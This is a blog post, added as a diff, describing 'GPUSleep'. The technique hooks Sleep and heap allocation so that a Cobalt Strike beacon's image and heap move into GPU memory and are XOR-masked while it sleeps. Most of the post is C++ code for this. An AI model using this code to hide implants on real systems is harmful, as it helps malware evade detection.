@@ -1,0 +1,331 @@
+---
+title:  "GPUSleep. Makes your beacon disappear into GPU memory (and eventually come back)."
+layout: post
+---
+
+Small project of mine that is designed to move Cobalt Strike (or any really) beacon image, and heap, from memory to GPU memory before going to sleep. And moves everything back at the same place after sleep.
+
+
+Tested on Windows 21H1, Visual Studio 2019 (v142) and an NVIDIA GTX860M. I used an old MSI laptop with a brand new Windows 10 install.
+
+## Intro
+I read some reports about how future malware could use the GPU to hide certain capabilities, and I was curious to see if it was already done. After reading [GPU-assisted malware](https://ieeexplore.ieee.org/document/5665801), I wanted to implement some malware technique that could make use of the GPU. I started reading about CUDA, trying to find if I could write chacha20 using CUDA, but that story if for another day.
+
+Around the same time, [VX-Underground](https://twitter.com/vxunderground) published a [piece of code](https://github.com/vxunderground/VXUG-Papers/blob/main/GpuMemoryAbuse.cpp) to move data into GPU memory. It was the perfect opportunity for me to start implementing some proof of concept.
+
+
+## GPU
+I am not an expert on GPUs, but I do know that GPUs have a dedicated memory used to store shaders, textures or even neural network architectures. NVIDIA has some nice documentation on writing CUDA code, for example, they publish a blog post on how to [optimize data transfers](https://developer.nvidia.com/blog/how-optimize-data-transfers-cuda-cc/) to GPU memory.
+Turns out, the current project do not use any CUDA code and is not even compiled using the CUDA toolchain.
+
+### nvcuda.dll
+
+NVIDIA drivers come with a `nvcuda.dll` that exports functions to communicate with the GPU. The idea here is just to load the dll and resolve those functions.
+
+```cpp
+BOOL InitNvidiaCudaAPITable(PNVIDIA_API_TABLE Api)
+{
+
+	if (Api->CudaInit) {
+		return TRUE;
+	}
+
+	Api->NvidiaLibary = LoadLibraryW(L"nvcuda.dll");
+	if (Api->NvidiaLibary == NULL)
+		return FALSE;
+
+	Api->CudaCreateContext = (CUDACREATECONTEXT)GetProcAddress(Api->NvidiaLibary, "cuCtxCreate_v2");
+	Api->CudaGetDevice = (CUDAGETDEVICE)GetProcAddress(Api->NvidiaLibary, "cuDeviceGet");
+	Api->CudaGetDeviceCount = (CUDAGETDEVICECOUNT)GetProcAddress(Api->NvidiaLibary, "cuDeviceGetCount");
+	Api->CudaInit = (CUDAINIT)GetProcAddress(Api->NvidiaLibary, "cuInit");
+	Api->CudaMemoryAllocate = (CUDAMEMORYALLOCATE)GetProcAddress(Api->NvidiaLibary, "cuMemAlloc_v2");
+	Api->CudaMemoryCopyToDevice = (CUDAMEMORYCOPYTODEVICE)GetProcAddress(Api->NvidiaLibary, "cuMemcpyHtoD_v2");
+	Api->CudaMemoryCopyToHost = (CUDAMEMORYCOPYTOHOST)GetProcAddress(Api->NvidiaLibary, "cuMemcpyDtoH_v2");
+	Api->CudaMemoryFree = (CUDAMEMORYFREE)GetProcAddress(Api->NvidiaLibary, "cuMemFree_v2");
+	Api->CudaDestroyContext = (CUDADESTROYCONTEXT)GetProcAddress(Api->NvidiaLibary, "cuCtxDestroy");
+
+	if (!Api->CudaCreateContext || !Api->CudaGetDevice || !Api->CudaGetDeviceCount || !Api->CudaInit || !Api->CudaDestroyContext)
+		return FALSE;
+
+	if (!Api->CudaMemoryAllocate || !Api->CudaMemoryCopyToDevice || !Api->CudaMemoryCopyToHost || !Api->CudaMemoryFree)
+		return FALSE;
+
+	return TRUE;
+}
+```
+
+Before one could communicate with the GPU, a context needs to be created.
+```cpp
+CUDA_CONTEXT initCuda(NVIDIA_API_TABLE* Api, CUDA_CONTEXT* ctx) {
+
+	INT DeviceCount = 0;
+	INT Device = 0;
+
+	if (!InitNvidiaCudaAPITable(Api))
+		return NULL;
+
+	if (Api->CudaInit(0) != CUDA_SUCCESS)
+		return NULL;
+
+	if (Api->CudaGetDeviceCount(&DeviceCount) != CUDA_SUCCESS || DeviceCount == 0)
+		return NULL;
+
+	if (Api->CudaGetDevice(&Device, DeviceCount - 1) != CUDA_SUCCESS)
+		return NULL;
+
+	if (Api->CudaCreateContext(ctx, 0, Device) != CUDA_SUCCESS)
+		return NULL;
+
+	return Context;
+}
+```
+
+You will later see that I have a bug with context creation.
+
+## Hooking
+Intercepting calls to `Sleep`, and later `RtlAllocateHeap` is done through hooking. I used [minhook](https://github.com/TsudaKageyu/minhook). It is a very nice library that makes hooking a pretty easy task.
+
+Hooking is performed at the start of the main function.
+```cpp
+  [...]
+
+  printf("MH_Initialize()\n");
+	if (MH_Initialize() != MH_OK)
+		goto EXIT_ROUTINE;
+
+	printf("MH_CreateHookApiEx()\n");
+	if (MH_CreateHookApiEx(L"ntdll.dll", "RtlAllocateHeap", &HookedHeapAlloc, &OldHeapAlloc) != MH_OK)
+		goto EXIT_ROUTINE;
+
+	printf("MH_CreateHookApiEx()\n");
+	if (MH_CreateHookApiEx(L"kernel32.dll", "Sleep", &HookedSleep, &OldSleep) != MH_OK)
+		goto EXIT_ROUTINE;
+
+	printf("MH_EnableHook()\n");
+	if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
+		goto EXIT_ROUTINE;
+
+  [...]
+```
+
+### Sleep
+This function will be called instead of normal `Sleep` by Cobalt Strike beacon. The whole idea resides here. Before sleeping, `MoveDLLToGPUStrorage` is called and the beacon is moved to GPU memory, the previous data is **not freed**, you can still see it allocated inside the debugger, except it is all 0. Them, `OldSleep` is called, this function points to the normal Windows API. After the sleep is done, `MoveDLLFromGPUStrorage` restores the memory and the execution can continue.
+
+```cpp
+
+void HookedSleep(DWORD dwMilliseconds) {
+
+	std::cout << "Hooked Sleep!\n";
+	// so Context cannot be init before CS beacon is fired up, I dunno why... If init before, cuda returns error 201
+	Context = initCuda(&Api, &Context);
+
+	ULONG_PTR storageGPU;
+	DWORD SizeOfHeaders;
+
+	storageGPU = MoveDLLToGPUStrorage(dll, &SizeOfHeaders, &Api);
+	std::cout << "Sleeping....\n";
+	OldSleep(dwMilliseconds);
+	MoveDLLFromGPUStrorage(dll, storageGPU, SizeOfHeaders, &Api);
+}
+```
+
+--------------- PIC -----------------
+
+### RtlAllocateHeap
+This part is not strictly needed, but I really enjoyed a blog post by [@waldo-irc](https://twitter.com/waldoirc) talking about [heap encryption](https://www.arashparsa.com/hook-heaps-and-live-free/). So I decided to make my own implementation. Please read the @waldo-irc's blog post to have a better understanding on what is happening here.
+
+Cobalt Strike's beacon allocates a heap segment to hold the decrypted config.
+The beacon uses `malloc`, which is just a wrapper to `HeapAlloc`. So the calls to `HeapAlloc` is actually performed by `msvcrt.dll`. I choose not to catch all heap allocations because otherwise the program crashes. Only allocations performed by `msvcrt.dll` are saved. `heapMap` is a map that stores all heap allocations and their size.
+
+> Note: `GetModuleBaseNameA` calls `HeapAlloc`, so `intercept` is used to prevent an infinite recursive call to `HookedHeapAlloc`.
+
+```cpp
+BOOL intercept = FALSE;
+
+LPVOID HookedHeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes) {
+	LPVOID pointerToEncrypt = OldHeapAlloc(hHeap, dwFlags, dwBytes);
+
+	if (intercept)
+		return pointerToEncrypt;
+
+	intercept = TRUE;
+	if (GlobalThreadId == GetCurrentThreadId()) { // If the calling ThreadId matches our initial thread id then continue
+
+		HMODULE hModule;
+		char lpBaseName[256];
+
+		if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)_ReturnAddress(), &hModule) != 0) {
+			if (GetModuleBaseNameA(GetCurrentProcess(), hModule, lpBaseName, sizeof(lpBaseName)) != 0) {
+				printf("Reserved %d at %08x from %s\n", dwBytes, pointerToEncrypt, lpBaseName);
+				if (!strcmp(lpBaseName, "msvcrt.dll") || !strcmp(lpBaseName, "ucrtbase.dll")) {
+					heapMap[pointerToEncrypt] = dwBytes;
+				}
+			}
+		}
+	}
+	intercept = FALSE;
+
+	return pointerToEncrypt;
+}
+```
+
+## Moving memory
+The heavy lifting is performed by two functions, `MoveDLLToGPUStrorage` and `MoveDLLFromGPUStrorage`.
+Those are basically minimal PE parsers. 
+
+### MoveDLLToGPUStrorage
+The total virtual size of the image  (+ all heap segments) is retrieved from the `NT header` and memory is allocated on the GPU. PE headers are then copied to the allocated memory. After that, all sections are accessed and copied to the GPU memory. It is important to note that the GPU memory now contains an exact replica of the in-memory image, with all relocations applied, reference to `.rodata`, etc. Finally, the heap segments are copied to the GPU memory and everything is set to zeroed out.
+
+The function returns the address of the allocated GPU memory segment, and update `SizeOfHeaders`.
+
+> Note: `heapLocationMap` keeps track of moved heap segments inside GPU memory.
+
+```cpp
+ULONG_PTR MoveDLLToGPUStrorage(HMODULE dll, PDWORD SizeOfHeaders, PNVIDIA_API_TABLE Api) {
+
+	// Get headers
+	DWORD oldProtect;
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dll;
+	PIMAGE_NT_HEADERS NTheader = GetNTHeaders((HMODULE)dll);
+
+	// Allocate memory for the DLL
+	ULONG_PTR storage = RtlAllocateGpuMemory(Api, NTheader->OptionalHeader.SizeOfImage + mapSize(heapMap));
+
+	printf("RtlAllocateGpuMemory: %08x\n", storage);
+
+	// copy headers to mem location
+	*SizeOfHeaders = (DWORD)(dosHeader->e_lfanew + NTheader->OptionalHeader.SizeOfHeaders);
+	Api->CudaMemoryCopyToDevice(storage, dll, dosHeader->e_lfanew + NTheader->OptionalHeader.SizeOfHeaders);
+
+	// Get first section
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(NTheader);
+
+	// Copy all sections to memory
+	for (int i = 0; i < NTheader->FileHeader.NumberOfSections; i++, section++)
+	{
+		DWORD SectionSize = section->Misc.VirtualSize;
+		printf("Section: %s - VirtualAddress %08x - VirtualSize %d - Moved to %08x\n", section->Name, (SIZE_T)dll + section->VirtualAddress, SectionSize, (ULONG_PTR)((SIZE_T)storage + section->VirtualAddress));
+
+		ULONG_PTR dst = (ULONG_PTR)((SIZE_T)storage + section->VirtualAddress);
+		Api->CudaMemoryCopyToDevice(dst, (byte*)dll + section->VirtualAddress, SectionSize);
+
+		//zero out section
+		VirtualProtect((LPVOID)((SIZE_T)dll + section->VirtualAddress), SectionSize, PAGE_READWRITE, &oldProtect);
+		memset((LPVOID)((SIZE_T)dll + section->VirtualAddress), 0, SectionSize);
+		VirtualProtect((LPVOID)((SIZE_T)dll + section->VirtualAddress), SectionSize, oldProtect, &oldProtect);
+	}
+
+	ULONG_PTR dst = (ULONG_PTR)((SIZE_T)storage + NTheader->OptionalHeader.SizeOfImage);
+	for (auto it = heapMap.cbegin(); it != heapMap.cend(); ++it)
+	{
+		printf("Moved %08x to %08x\n", it->first, dst);
+
+		heapLocationMap[(LPVOID)dst] = it->first;
+
+		Api->CudaMemoryCopyToDevice((ULONG_PTR)dst, it->first, it->second);
+
+		memset(it->first, 0, it->second); // zero out
+		dst = (ULONG_PTR)((SIZE_T)dst + it->second);
+	}
+
+	//zero module headers
+	VirtualProtect((LPVOID)dll, dosHeader->e_lfanew + NTheader->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldProtect);
+	memset((LPVOID)dll, 0, dosHeader->e_lfanew + NTheader->OptionalHeader.SizeOfHeaders);
+	VirtualProtect((LPVOID)dll, dosHeader->e_lfanew + NTheader->OptionalHeader.SizeOfHeaders, oldProtect, &oldProtect);
+
+	return storage;
+}
+```
+
+### MoveDLLFromGPUStrorage
+This function does what the previous function did but in reverse. The function uses `SizeOfHeaders` to move the PE headers from GPU memory to previous location and then parses those headers. Sections are then moved back in place at the exact same position than before. Heap segments are restored as well and finally, the GPU memory is freed.
+```cpp
+VOID MoveDLLFromGPUStrorage(HMODULE dll, ULONG_PTR storage, DWORD SizeOfHeaders, PNVIDIA_API_TABLE Api) {
+	DWORD oldProtect;
+
+	// Set mem to zero and copy headers to mem location
+	VirtualProtect((LPVOID)dll, SizeOfHeaders, PAGE_READWRITE, &oldProtect);
+	Api->CudaMemoryCopyToHost((PVOID)dll, storage, SizeOfHeaders);
+	VirtualProtect((LPVOID)dll, SizeOfHeaders, oldProtect, &oldProtect);
+
+	// Get headers
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dll;
+	PIMAGE_NT_HEADERS NTheader = GetNTHeaders((HMODULE)dll);
+
+	// Get first section
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(NTheader);
+
+	// Copy all sections to memory
+	for (int i = 0; i < NTheader->FileHeader.NumberOfSections; i++, section++)
+	{
+		DWORD SectionSize = section->Misc.VirtualSize;
+		printf("Section: %s - VirtualAddress %08x - VirtualSize %d - Moved from %08x\n", section->Name, (SIZE_T)dll + section->VirtualAddress, SectionSize, (ULONG_PTR)((SIZE_T)storage + section->VirtualAddress));
+
+		LPVOID dst = (void*)((SIZE_T)dll + section->VirtualAddress);
+		VirtualProtect(dst, SectionSize, PAGE_READWRITE, &oldProtect);
+		Api->CudaMemoryCopyToHost((PVOID)dst, storage + section->VirtualAddress, SectionSize);
+		VirtualProtect(dst, SectionSize, oldProtect, &oldProtect);
+	}
+
+	for (auto it = heapLocationMap.cbegin(); it != heapLocationMap.cend(); ++it)
+	{
+		printf("Moved %08x to %08x\n", it->first, it->second);
+
+		Api->CudaMemoryCopyToHost((PVOID)it->second, (ULONG_PTR)it->first, heapMap[it->second]);
+	}
+
+	heapLocationMap.clear();
+
+	Api->CudaMemoryFree(storage);
+}
+
+```
+
+## Heap encryption
+I am not going to explain everything about how to encrypt the heap, go read @waldo-irc blog post. After adding heap encryption, `HookedSleep` looks like this.
+
+```cpp
+void HookedSleep(DWORD dwMilliseconds) {
+
+	std::cout << "Hooked Sleep!\n";
+	// so Context cannot be init before CS beacon is fired up, I dunno why... If init before, cuda returns error 201
+	Context = initCuda(&Api, &Context);
+
+	ULONG_PTR storageGPU;
+
+	DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
+	std::cout << "Heap encrypt starts\n";
+	HeapEncryptMap(heapMap);
+
+	DWORD SizeOfHeaders;
+	storageGPU = MoveDLLToGPUStrorage(dll, &SizeOfHeaders, &Api);
+	std::cout << "Sleeping....\n";
+	OldSleep(dwMilliseconds);
+	MoveDLLFromGPUStrorage(dll, storageGPU, SizeOfHeaders, &Api);
+
+	HeapEncryptMap(heapMap);
+	std::cout << "Heap decrypt done\n";
+	DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
+}
+```
+
+`DoSuspendThreads` suspends all threads except the current one and `HeapEncryptMap` XOR all heap segments registered to `heapMap`.
+
+## Bug
+As you can see, `initCuda` is called everytime the beacon sleeps. When working with a test DLL that does nothing except sleeping and printing a string in a "for-loop", the CUDA context does not have to be recreated for each sleep. I did not found the cause and the code works like that so ¯\\\_(ツ)_/¯
+
+
+## Demo
+Here are some screenshots.
+
+## Credit
+Big thanks to @smelly__vx, it's actually his code that gave me the idea. 
+
+
+## Outro
+The technique described in the blog shows how to move a loaded DLL to and from GPU memory. This is a new obfuscation technique that I find very cool. Unfortunatly, I do not see it used during an engagement. The use case is very limited. Nevertheless, it was a really fun project!
+
+## References
+[LockdExeDemo](https://www.arashparsa.com/hook-heaps-and-live-free/) by @waldo-irc   
+[GpuMemoryAbuse.cpp](https://github.com/vxunderground/VXUG-Papers/blob/main/GpuMemoryAbuse.cpp) by @smelly__vx  
+[minihook](https://github.com/TsudaKageyu/minhook) by @TsudaKageyu
